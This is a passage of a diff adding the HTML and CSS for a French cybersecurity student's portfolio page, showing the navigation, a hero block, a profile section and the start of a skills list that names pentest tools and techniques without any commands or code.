@@ -1,0 +1,3469 @@
+<title>Maxence Meunier</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="Portfolio cybersécurité de Maxence Meunier — Bachelor Cybersécurité à Guardia, recherche d'alternance en sécurité offensive.">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;450;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<style>
+/* Layout : portfolio cybersécurité — barre fixe + sections ancrées, base de connaissances filtrable, write-up vitrine */
+:root{
+  --bg:#f5f8f6; --surface:#ffffff; --surface-2:#eaf1ed; --code-bg:#0f1620; --code-fg:#dfe8ee;
+  --border:#d7e1db; --border-strong:#c2cfc8;
+  --fg:#10201a; --muted:#566a61; --faint:#879389;
+  --accent:#0a8f6e; --accent-2:#1f9bd6; --accent-ink:#064d3c; --accent-soft:#d6efe6;
+  --warn:#b5761a; --crit:#c0392b; --crit-soft:#fbe4e1;
+  --mark:#fff3c4; --mark-fg:#5a4a10;
+  --grad:linear-gradient(100deg,#0a8f6e,#1f9bd6);
+  --shadow:0 1px 2px rgba(16,32,26,.05),0 10px 34px -16px rgba(16,32,26,.2);
+  --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:'Inter',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  --disp:'Space Grotesk',var(--sans);
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0b0f13; --surface:#141b22; --surface-2:#1b242d; --code-bg:#080c11; --code-fg:#dbe6ef;
+  --border:#253039; --border-strong:#33414c;
+  --fg:#e8eef3; --muted:#9aa7b2; --faint:#687680;
+  --accent:#3fd9a4; --accent-2:#54c2f0; --accent-ink:#c3f4e3; --accent-soft:#113029;
+  --warn:#e8b25a; --crit:#ff6b5c; --crit-soft:#2c1613;
+  --mark:#4a3f16; --mark-fg:#ffe79a;
+  --grad:linear-gradient(100deg,#3fd9a4,#54c2f0);
+  --shadow:0 1px 2px rgba(0,0,0,.45),0 14px 40px -18px rgba(0,0,0,.75);
+  color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#0b0f13; --surface:#141b22; --surface-2:#1b242d; --code-bg:#080c11; --code-fg:#dbe6ef;
+  --border:#253039; --border-strong:#33414c;
+  --fg:#e8eef3; --muted:#9aa7b2; --faint:#687680;
+  --accent:#3fd9a4; --accent-2:#54c2f0; --accent-ink:#c3f4e3; --accent-soft:#113029;
+  --warn:#e8b25a; --crit:#ff6b5c; --crit-soft:#2c1613;
+  --mark:#4a3f16; --mark-fg:#ffe79a;
+  --grad:linear-gradient(100deg,#3fd9a4,#54c2f0);
+  --shadow:0 1px 2px rgba(0,0,0,.45),0 14px 40px -18px rgba(0,0,0,.75);
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--sans);font-size:15px;line-height:1.62;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+.wrap{max-width:1120px;margin:0 auto;
+  padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+
+/* ---------- top bar ---------- */
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:50;background:var(--surface)}
+.topbar{position:sticky;top:env(safe-area-inset-top,0px);z-index:40;
+  background:color-mix(in srgb,var(--surface) 90%,transparent);backdrop-filter:saturate(1.3) blur(10px);
+  border-bottom:1px solid var(--border)}
+.topbar-in{display:flex;align-items:center;gap:16px;min-height:60px}
+.brand{display:flex;align-items:center;gap:11px;font-weight:600;white-space:nowrap;text-decoration:none;color:var(--fg)}
+.mono-badge{display:grid;place-items:center;width:34px;height:34px;border-radius:9px;background:var(--grad);
+  color:#04110c;font-family:var(--mono);font-weight:700;font-size:13px;letter-spacing:-.02em;flex:none}
+.brand .nm{font-family:var(--disp);letter-spacing:-.01em;font-size:15.5px}
+.brand .rl{font-family:var(--mono);font-size:10.5px;color:var(--faint);letter-spacing:.04em}
+.navlinks{display:flex;gap:4px;margin-left:auto}
+.navlinks a{font-family:var(--mono);font-size:12.5px;color:var(--muted);text-decoration:none;padding:7px 11px;border-radius:7px}
+.navlinks a:hover{color:var(--fg);background:var(--surface-2)}
+.navlinks a.active{color:var(--accent);background:var(--accent-soft)}
+.tbtn{flex:none;display:inline-flex;align-items:center;justify-content:center;width:38px;height:38px;border-radius:9px;
+  background:var(--surface-2);border:1px solid var(--border);color:var(--fg);cursor:pointer}
+.tbtn:hover{border-color:var(--border-strong)}.tbtn svg{width:17px;height:17px}
+.menu-btn{display:none;margin-left:auto}
+
+/* ---------- hero ---------- */
+.hero{padding:54px 0 30px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;top:-120px;right:-80px;width:420px;height:420px;z-index:0;pointer-events:none;
+  background:radial-gradient(closest-side,color-mix(in srgb,var(--accent) 22%,transparent),transparent);opacity:.5}
+.hero>*{position:relative;z-index:1}
+.avail{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:12px;color:var(--accent-ink);
+  background:var(--accent-soft);border:1px solid color-mix(in srgb,var(--accent) 30%,transparent);
+  border-radius:999px;padding:6px 13px}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .avail{color:var(--accent)}}
+:root[data-theme="dark"] .avail{color:var(--accent)}
+.avail .pulse{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 0 color-mix(in srgb,var(--accent) 70%,transparent);animation:pulse 2.2s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 color-mix(in srgb,var(--accent) 55%,transparent)}70%{box-shadow:0 0 0 9px transparent}100%{box-shadow:0 0 0 0 transparent}}
+.hero h1{font-family:var(--disp);font-weight:700;font-size:clamp(2.5rem,8vw,4.4rem);line-height:.98;letter-spacing:-.035em;
+  margin:18px 0 0;text-wrap:balance}
+.hero .role{font-family:var(--disp);font-weight:600;font-size:clamp(1.1rem,3.4vw,1.6rem);letter-spacing:-.02em;margin:10px 0 0}
+.hero .role .g{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lede{margin:16px 0 0;max-width:62ch;color:var(--muted);font-size:clamp(1rem,2.3vw,1.14rem)}
+.hero-cta{display:flex;flex-wrap:wrap;gap:10px;margin-top:24px}
+.btn{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:13px;font-weight:500;
+  padding:11px 17px;border-radius:10px;text-decoration:none;cursor:pointer;border:1px solid transparent}
+.btn svg{width:15px;height:15px}
+.btn-primary{background:var(--grad);color:#04110c;font-weight:600}
+.btn-primary:hover{filter:brightness(1.06)}
+.btn-ghost{background:var(--surface);color:var(--fg);border-color:var(--border)}
+.btn-ghost:hover{border-color:var(--border-strong)}
+
+/* stats */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;margin-top:38px;background:var(--border);
+  border:1px solid var(--border);border-radius:14px;overflow:hidden}
+.stat{background:var(--surface);padding:18px 16px}
+.stat .n{font-family:var(--disp);font-weight:700;font-size:clamp(1.5rem,4vw,2.1rem);letter-spacing:-.02em;line-height:1}
+.stat .n .g{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat .l{font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint);margin-top:7px}
+
+/* ---------- sections ---------- */
+section{padding:48px 0;border-top:1px solid var(--border)}
+.sec-eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);
+  display:flex;align-items:center;gap:9px;margin-bottom:8px}
+.sec-eyebrow .num{color:var(--faint)}
+.sec-eyebrow::after{content:"";flex:1;height:1px;background:var(--border);max-width:120px}
+.sec-title{font-family:var(--disp);font-weight:650;font-size:clamp(1.5rem,4vw,2.1rem);letter-spacing:-.025em;margin:0 0 6px;text-wrap:balance}
+.sec-sub{color:var(--muted);max-width:66ch;margin:0 0 26px}
+
+/* profil */
+.profil{display:grid;grid-template-columns:1.5fr 1fr;gap:28px;align-items:start}
+.profil .bio p{margin:0 0 14px}
+.profil .bio p:last-child{margin-bottom:0}
+.profil .bio strong{color:var(--fg)}
+.facts{background:var(--surface);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);overflow:hidden}
+.fact{display:flex;gap:12px;padding:14px 18px;border-bottom:1px solid var(--border)}
+.fact:last-child{border-bottom:none}
+.fact .ico{color:var(--accent);flex:none;margin-top:2px}.fact .ico svg{width:17px;height:17px}
+.fact .k{font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint)}
+.fact .v{font-size:13.6px;font-weight:500;margin-top:2px}
+.fact .v small{color:var(--muted);font-weight:400}
+
+/* skills */
+.skills{display:grid;grid-template-columns:repeat(auto-fit,minmax(265px,1fr));gap:16px}
+.skill{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px;box-shadow:var(--shadow)}
+.skill h3{font-family:var(--disp);font-weight:600;font-size:1.02rem;margin:0 0 4px;display:flex;align-items:center;gap:9px}
+.skill h3 .si{display:grid;place-items:center;width:30px;height:30px;border-radius:8px;background:var(--accent-soft);color:var(--accent);flex:none}
+.skill h3 .si svg{width:16px;height:16px}
+.skill p{color:var(--muted);font-size:13px;margin:0 0 13px}
+.tags{display:flex;flex-wrap:wrap;gap:6px}
+.tag{font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border);
+  border-radius:6px;padding:3px 8px}
+
+/* réalisation / case study */
+.case{background:var(--surface);border:1px solid var(--border);border-radius:18px;box-shadow:var(--shadow);overflow:hidden}
+.case-top{padding:clamp(20px,3vw,30px);border-bottom:1px solid var(--border);
+  background:linear-gradient(180deg,color-mix(in srgb,var(--accent-soft) 55%,transparent),transparent)}
+.case-badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
+.pill{font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:999px;border:1px solid var(--border);color:var(--muted)}
+.pill.crit{color:var(--crit);background:var(--crit-soft);border-color:color-mix(in srgb,var(--crit) 35%,transparent)}
+.pill.ok{color:var(--accent-ink);background:var(--accent-soft);border-color:color-mix(in srgb,var(--accent) 35%,transparent)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .pill.ok{color:var(--accent)}}
+:root[data-theme="dark"] .pill.ok{color:var(--accent)}
+.case h3{font-family:var(--disp);font-weight:650;font-size:clamp(1.3rem,3.3vw,1.7rem);letter-spacing:-.02em;margin:0 0 6px}
+.case .ctx{color:var(--muted);margin:0;font-size:14px}
+.case-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border)}
+.cg{background:var(--surface);padding:16px}
+.cg .k{font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint)}
+.cg .v{font-family:var(--disp);font-weight:600;font-size:15px;margin-top:5px;letter-spacing:-.01em}
+.cg .v.g{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.case-body{padding:clamp(20px,3vw,30px)}
+.case-cols{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.case-cols h4{font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--accent);margin:0 0 10px;display:flex;align-items:center;gap:7px}
+.steps{list-style:none;margin:0;padding:0;counter-reset:s}
+.steps li{position:relative;padding:0 0 12px 30px;counter-increment:s;font-size:13.6px;color:var(--fg)}
+.steps li::before{content:counter(s,decimal-leading-zero);position:absolute;left:0;top:0;font-family:var(--mono);font-size:11px;
+  color:var(--accent);font-weight:600}
+.steps li::after{content:"";position:absolute;left:8px;top:18px;bottom:2px;width:1px;background:var(--border)}
+.steps li:last-child::after{display:none}
+.wins{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:9px}
+.wins li{display:flex;gap:9px;font-size:13.6px}
+.wins li svg{width:16px;height:16px;color:var(--accent);flex:none;margin-top:2px}
+.case-foot{margin-top:22px;padding-top:18px;border-top:1px dashed var(--border-strong);display:flex;flex-wrap:wrap;gap:12px;align-items:center;justify-content:space-between}
+.case-foot .note{color:var(--muted);font-size:12.5px;font-family:var(--mono)}
+
+/* knowledge base */
+.kb-toolbar{display:flex;flex-wrap:wrap;gap:12px;align-items:center;margin-bottom:22px}
+.kb-search{position:relative;flex:1;min-width:200px}
+.kb-search input{width:100%;font-family:var(--mono);font-size:13px;color:var(--fg);background:var(--surface);
+  border:1px solid var(--border);border-radius:10px;padding:10px 12px 10px 34px}
+.kb-search input::placeholder{color:var(--faint)}
+.kb-search svg{position:absolute;left:11px;top:50%;transform:translateY(-50%);width:15px;height:15px;color:var(--faint)}
+.filters{display:flex;flex-wrap:wrap;gap:6px}
+.filt{font-family:var(--mono);font-size:12px;color:var(--muted);background:var(--surface);border:1px solid var(--border);
+  border-radius:999px;padding:7px 13px;cursor:pointer}
+.filt:hover{border-color:var(--border-strong)}
+.filt.on{color:#04110c;background:var(--accent);border-color:var(--accent);font-weight:600}
+.kb-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);overflow:hidden;
+  display:flex;flex-direction:column;align-self:start}
+.card-head{display:flex;gap:13px;padding:17px 18px;cursor:pointer;align-items:flex-start;text-align:left;width:100%;
+  background:none;border:none;color:inherit;font:inherit}
+.card-head:hover{background:color-mix(in srgb,var(--surface-2) 50%,transparent)}
+.card-idx{font-family:var(--mono);font-size:11px;color:var(--accent);font-weight:600;margin-top:3px;flex:none}
+.card-main{flex:1;min-width:0}
+.card-main .t{font-family:var(--disp);font-weight:600;font-size:1.02rem;letter-spacing:-.01em;line-height:1.25}
+.card-main .d{color:var(--muted);font-size:12.8px;margin-top:4px}
+.card-meta{display:flex;flex-wrap:wrap;gap:6px;margin-top:11px;align-items:center}
+.card-meta .tag{font-size:10.5px;padding:2px 7px}
+.card-meta .cmds{font-family:var(--mono);font-size:10.5px;color:var(--faint);margin-left:auto;white-space:nowrap}
+.chev{flex:none;color:var(--faint);transition:transform .22s;margin-top:3px}
+.chev svg{width:16px;height:16px;display:block}
+.card.open .chev{transform:rotate(90deg);color:var(--accent)}
+.card-body{display:none;padding:0 18px 20px;border-top:1px solid var(--border)}
+.card.open .card-body{display:block}
+.card-body .inner{padding-top:16px}
+
+/* rendered markdown */
+.md{font-size:14px}
+.md>*:first-child{margin-top:0}
+.md h1,.md h2,.md h3,.md h4{font-family:var(--disp);letter-spacing:-.01em;line-height:1.25;margin:1.5em 0 .5em;text-wrap:balance}
+.md h1{font-size:1.2rem;padding-bottom:.3em;border-bottom:1px solid var(--border)}
+.md h2{font-size:1.08rem}.md h3{font-size:.98rem}.md h4{font-size:.9rem;color:var(--muted)}
+.md p{margin:.65em 0}.md ul,.md ol{margin:.55em 0;padding-left:1.4em}.md li{margin:.28em 0}
+.md li::marker{color:var(--accent)}.md a{word-break:break-word}.md strong{color:var(--fg);font-weight:600}
+.md hr{border:none;border-top:1px dashed var(--border-strong);margin:1.5em 0}
+.md blockquote{margin:1em 0;padding:.55em 1em;border-left:3px solid var(--accent);background:var(--accent-soft);border-radius:0 8px 8px 0}
+.md blockquote p{margin:.3em 0}
+mark{background:var(--mark);color:var(--mark-fg);padding:.05em .3em;border-radius:4px;font-weight:500}
+.wl{font-family:var(--mono);font-size:.92em;color:var(--accent);background:var(--accent-soft);padding:.05em .35em;border-radius:4px}
+.note-img{display:block;margin:1em 0;border:1px solid var(--border);border-radius:10px;background:var(--surface-2)}
+.md :not(pre)>code{font-family:var(--mono);font-size:.85em;background:var(--surface-2);color:var(--accent-ink);padding:.12em .4em;border-radius:5px;border:1px solid var(--border);word-break:break-word}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .md :not(pre)>code{color:var(--accent)}}
+:root[data-theme="dark"] .md :not(pre)>code{color:var(--accent)}
+.codewrap{position:relative;margin:1em 0;border-radius:11px;overflow:hidden;border:1px solid #1f2a35;background:var(--code-bg)}
+.codewrap .cbar{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;background:#0a0f15;border-bottom:1px solid #1f2a35}
+.codewrap .lang{font-family:var(--mono);font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:#6f8597}
+.codewrap .copy{font-family:var(--mono);font-size:11px;color:#9fb3c2;background:transparent;border:1px solid #27333e;border-radius:6px;padding:3px 9px;cursor:pointer;display:inline-flex;align-items:center;gap:5px}
+.codewrap .copy:hover{color:#dbe6ef;border-color:#3a4854}.codewrap .copy.done{color:#3fd9a4;border-color:#3fd9a4}
+.codewrap pre{margin:0;overflow-x:auto;padding:13px 14px}
+.codewrap pre code{font-family:var(--mono);font-size:12.6px;line-height:1.62;color:var(--code-fg);background:none;border:none;padding:0;white-space:pre}
+.tablewrap{overflow-x:auto;margin:1em 0;border:1px solid var(--border);border-radius:10px}
+.md table{border-collapse:collapse;width:100%;font-size:13px;min-width:420px}
+.md th,.md td{text-align:left;padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+.md thead th{font-family:var(--mono);font-size:10.5px;letter-spacing:.04em;text-transform:uppercase;color:var(--muted);background:var(--surface-2);white-space:nowrap}
+.md tbody tr:last-child td{border-bottom:none}
+.md tbody tr:nth-child(even){background:color-mix(in srgb,var(--surface-2) 45%,transparent)}
+.noresult{display:none;text-align:center;color:var(--muted);font-family:var(--mono);font-size:14px;padding:40px 0}
+.noresult.on{display:block}
+
+/* machines / write-ups */
+.mach{background:var(--surface);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);overflow:hidden;margin-bottom:14px}
+.mach>summary{list-style:none;cursor:pointer;display:flex;gap:14px;align-items:flex-start;padding:18px}
+.mach>summary::-webkit-details-marker{display:none}
+.mach>summary:hover{background:color-mix(in srgb,var(--surface-2) 50%,transparent)}
+.mach-idx{font-family:var(--mono);font-size:12px;color:var(--accent);font-weight:600;margin-top:3px;flex:none}
+.mach-main{flex:1;min-width:0}
+.mach-name{font-family:var(--disp);font-weight:650;font-size:1.12rem;letter-spacing:-.01em}
+.mach-sum{display:block;font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px;word-break:break-word}
+.mach-chips{display:flex;flex-wrap:wrap;gap:6px;margin-top:11px}
+.mchip{font-family:var(--mono);font-size:10.5px;padding:3px 9px;border-radius:999px;border:1px solid var(--border);color:var(--muted);white-space:nowrap}
+.mchip.root{color:var(--accent-ink);background:var(--accent-soft);border-color:color-mix(in srgb,var(--accent) 32%,transparent)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .mchip.root{color:var(--accent)}}
+:root[data-theme="dark"] .mchip.root{color:var(--accent)}
+.mach .chev{flex:none;color:var(--faint);transition:transform .22s;margin-top:3px}
+.mach .chev svg{width:16px;height:16px;display:block}
+.mach[open] .chev{transform:rotate(90deg);color:var(--accent)}
+.mach[open]>summary{border-bottom:1px solid var(--border)}
+.mach-body{padding:18px}
+.killchain{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.phase h5{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--accent);margin:0 0 10px;display:flex;align-items:center;gap:7px}
+.phase h5 .ph{display:grid;place-items:center;width:20px;height:20px;border-radius:6px;background:var(--accent-soft);font-size:10px;color:var(--accent)}
+.phase ul{margin:0;padding-left:16px;display:flex;flex-direction:column;gap:7px}
+.phase li{font-size:13px;color:var(--fg);line-height:1.5}
+.phase li::marker{color:var(--border-strong)}
+.phase code{font-family:var(--mono);font-size:.85em;background:var(--surface-2);color:var(--accent-ink);padding:.1em .35em;border-radius:4px;border:1px solid var(--border)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .phase code{color:var(--accent)}}
+:root[data-theme="dark"] .phase code{color:var(--accent)}
+.mach-tags{margin-top:16px;padding-top:14px;border-top:1px dashed var(--border-strong);display:flex;flex-wrap:wrap;gap:6px}
+.mach-note{margin-top:20px;color:var(--faint);font-family:var(--mono);font-size:12px}
+@media (max-width:720px){.killchain{grid-template-columns:1fr;gap:16px}}
+
+/* contact */
+.contact-card{background:var(--surface);border:1px solid var(--border);border-radius:18px;box-shadow:var(--shadow);
+  padding:clamp(24px,4vw,40px);text-align:center}
+.contact-card h2{font-family:var(--disp);font-weight:650;font-size:clamp(1.5rem,4vw,2.1rem);letter-spacing:-.025em;margin:0 0 8px}
+.contact-card p{color:var(--muted);max-width:52ch;margin:0 auto 22px}
+.contact-row{display:flex;flex-wrap:wrap;gap:10px;justify-content:center}
+.clink{display:inline-flex;align-items:center;gap:9px;font-family:var(--mono);font-size:13px;text-decoration:none;
+  color:var(--fg);background:var(--surface-2);border:1px solid var(--border);border-radius:10px;padding:11px 15px}
+.clink:hover{border-color:var(--accent);color:var(--accent)}
+.clink svg{width:16px;height:16px;flex:none}
+.clink.todo{color:var(--faint);cursor:default;border-style:dashed}
+.clink.todo:hover{border-color:var(--border);color:var(--faint)}
+.copybtn{cursor:pointer}
+.copybtn.done{color:var(--accent);border-color:var(--accent)}
+
+footer{border-top:1px solid var(--border);padding:22px 0 42px;color:var(--faint);font-family:var(--mono);font-size:11.5px;
+  display:flex;flex-wrap:wrap;gap:6px 16px;justify-content:space-between}
+
+@media (max-width:820px){
+  .navlinks{display:none}.menu-btn{display:inline-flex}
+  .navlinks.mobile{display:flex;position:fixed;inset:calc(60px + env(safe-area-inset-top,0px)) 0 auto 0;z-index:35;
+    flex-direction:column;gap:2px;background:var(--surface);border-bottom:1px solid var(--border);box-shadow:var(--shadow);
+    padding:12px max(18px,env(safe-area-inset-left,0px))}
+  .navlinks.mobile a{padding:11px}
+  .profil{grid-template-columns:1fr}
+  .case-cols{grid-template-columns:1fr;gap:20px}
+}
+@media (max-width:560px){
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .case-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media (prefers-reduced-motion:reduce){*{scroll-behavior:auto!important;transition:none!important;animation:none!important}}
+html{scroll-behavior:smooth}
+</style>
+
+<div class="topbar"><div class="wrap topbar-in">
+  <a class="brand" href="#top">
+    <span class="mono-badge">MM</span>
+    <span><span class="nm">Maxence Meunier</span><br><span class="rl">cybersécurité · sécurité offensive</span></span>
+  </a>
+  <nav class="navlinks" id="nav">
+    <a href="#profil">Profil</a>
+    <a href="#competences">Compétences</a>
+    <a href="#realisation">Réalisation</a>
+    <a href="#machines">Machines</a>
+    <a href="#connaissances">Connaissances</a>
+    <a href="#contact">Contact</a>
+  </nav>
+  <button class="tbtn menu-btn" id="menuBtn" aria-label="Menu" aria-expanded="false">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+  </button>
+  <button class="tbtn" id="themeBtn" aria-label="Changer de thème">
+    <svg id="icoMoon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"/></svg>
+    <svg id="icoSun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" hidden><circle cx="12" cy="12" r="4.2"/><path d="M12 2v2.5M12 19.5V22M4.2 4.2l1.8 1.8M18 18l1.8 1.8M2 12h2.5M19.5 12H22M4.2 19.8 6 18M18 6l1.8-1.8"/></svg>
+  </button>
+</div></div>
+
+<span id="top"></span>
+<header class="hero"><div class="wrap">
+  <span class="avail"><span class="pulse"></span>Disponible pour une alternance en cybersécurité</span>
+  <h1>Maxence Meunier</h1>
+  <p class="role">Étudiant en <span class="g">cybersécurité</span> — orienté sécurité offensive</p>
+  <p class="lede">Bachelor Cybersécurité à Guardia Cybersecurity School. Je me forme au test d'intrusion sur des machines HackTheBox et des CTF, et je documente chaque technique dans une base de connaissances méthodique — de la reconnaissance à l'élévation de privilèges.</p>
+  <div class="hero-cta">
+    <a class="btn btn-primary" href="#realisation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M13 2 3 14h7l-1 8 10-12h-7z"/></svg>Voir une réalisation</a>
+    <a class="btn btn-ghost" href="#contact"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 4h16v16H4z"/><path d="m4 7 8 6 8-6"/></svg>Me contacter</a>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="n"><span class="g">7</span></div><div class="l">Machines rootées</div></div>
+    <div class="stat"><div class="n"><span class="g">15</span></div><div class="l">Fiches techniques</div></div>
+    <div class="stat"><div class="n"><span class="g">190+</span></div><div class="l">Commandes documentées</div></div>
+    <div class="stat"><div class="n"><span class="g">root</span></div><div class="l">VulnHub · HTB</div></div>
+  </div>
+</div></header>
+
+<main>
+<section id="profil"><div class="wrap">
+  <div class="sec-eyebrow"><span class="num">01</span> À propos</div>
+  <h2 class="sec-title">Un profil offensif, méthodique et autonome</h2>
+  <div class="profil">
+    <div class="bio">
+      <p>Je suis en <strong>Bachelor Cybersécurité à Guardia Cybersecurity School</strong>, la première école française 100&nbsp;% dédiée à la cybersécurité. Ce qui m'anime&nbsp;: comprendre comment un système se compromet pour mieux le défendre — la logique «&nbsp;<strong>surface d'attaque → exploitation</strong>&nbsp;».</p>
+      <p>En dehors des cours, je m'entraîne en continu sur <strong>HackTheBox</strong> et des <strong>CTF</strong>, dans un environnement de travail professionnel (<strong>Kali / Exégol</strong>). Chaque machine résolue alimente une base de connaissances personnelle&nbsp;: web, réseau, Active Directory, exploitation bas niveau, post-exploitation.</p>
+      <p>Je cherche une <strong>alternance en cybersécurité</strong> (pentest, SOC, sécurité des SI) où mettre cette curiosité et cette rigueur au service d'une équipe — et continuer à monter en compétence sur le terrain.</p>
+    </div>
+    <div class="facts">
+      <div class="fact"><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 10 12 5 2 10l10 5 10-5Z"/><path d="M6 12v5c0 1 3 3 6 3s6-2 6-3v-5"/></svg></span><div><div class="k">Formation</div><div class="v">Bachelor Cybersécurité<br><small>Guardia Cybersecurity School</small></div></div></div>
+      <div class="fact"><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2a7 7 0 0 1 7 7c0 5-7 13-7 13S5 14 5 9a7 7 0 0 1 7-7Z"/><circle cx="12" cy="9" r="2.3"/></svg></span><div><div class="k">Recherche</div><div class="v">Alternance cybersécurité<br><small>Pentest · SOC · sécurité des SI</small></div></div></div>
+      <div class="fact"><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="m7 9 3 3-3 3M13 15h4"/></svg></span><div><div class="k">Environnement</div><div class="v">Kali Linux · Exégol<br><small>Bash · Python · Git</small></div></div></div>
+      <div class="fact"><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2 4 6v6c0 5 3.4 8 8 10 4.6-2 8-5 8-10V6l-8-4Z"/><path d="m9 12 2 2 4-4"/></svg></span><div><div class="k">Entraînement</div><div class="v">HackTheBox · CTF<br><small>Machines & write-ups</small></div></div></div>
+    </div>
+  </div>
+</div></section>
+
+<section id="competences"><div class="wrap">
+  <div class="sec-eyebrow"><span class="num">02</span> Compétences</div>
+  <h2 class="sec-title">Ce que je sais faire</h2>
+  <p class="sec-sub">Compétences construites sur des cas pratiques et consolidées dans ma base de connaissances. Les outils cités ci-dessous sont ceux que je manipule réellement.</p>
+  <div class="skills">
+    <div class="skill">
+      <h3><span class="si"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3" stroke-linecap="round"/></svg></span>Reconnaissance & énumération</h3>
+      <p>Cartographier la surface d'attaque, du repérage passif au scan de services.</p>
+      <div class="tags"><span class="tag">Nmap</span><span class="tag">Gobuster</span><span class="tag">Feroxbuster</span><span class="tag">WhatWeb</span><span class="tag">crt.sh</span><span class="tag">Shodan</span><span class="tag">SNMP</span><span class="tag">Kiterunner</span></div>
+    </div>
+    <div class="skill">
+      <h3><span class="si"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15 15 0 0 1 0 20M12 2a15 15 0 0 0 0 20"/></svg></span>Sécurité web & API</h3>
+      <p>Attaquer les applications web et les API, des injections aux logiques métier.</p>
+      <div class="tags"><span class="tag">Injection SQL</span><span class="tag">LFI</span><span class="tag">REST / GraphQL</span><span class="tag">ffuf</span><span class="tag">Burp Suite</span><span class="tag">WPScan</span><span class="tag">flask-unsign</span><span class="tag">git-dumper</span></div>
+    </div>
+    <div class="skill">
+      <h3><span class="si"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="2" y="4" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="6" rx="2"/><path d="M6 8h.01M6 17h.01"/></svg></span>Services & annuaires</h3>
+      <p>Énumérer et exploiter les services réseau et les environnements Windows.</p>
